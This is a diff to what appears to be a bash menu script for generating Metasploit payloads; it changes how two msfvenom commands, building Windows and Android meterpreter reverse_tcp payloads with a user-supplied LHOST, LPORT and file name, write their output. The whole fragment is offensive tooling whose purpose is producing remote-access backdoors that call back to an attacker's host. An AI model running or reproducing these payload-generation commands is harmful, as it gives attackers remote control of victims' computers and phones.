@@ -7,7 +7,7 @@ read -p "[+] LHOST : " lhost
 read -p "[+] LPORT : " lport
 read -p "[+] NAME  : " name
 echo "$cyan[INFO]$wh Generating . . . (wait)"
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport >$name
 echo "$g[+]$wh Generated !"
 fi
 if [ "$evil" -eq "02" ];then
@@ -15,7 +15,7 @@ read -p "[+] LHOST : " lhost
 read -p "[+] LPORT : " lport
 read -p "[+] NAME  : " name
 echo "$cyan[INFO]$wh Generating . . . (wait)"
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport >$name
 echo "$g[+]$wh Generated !"
 fi
 if [ "$evil" -eq "00" ];then
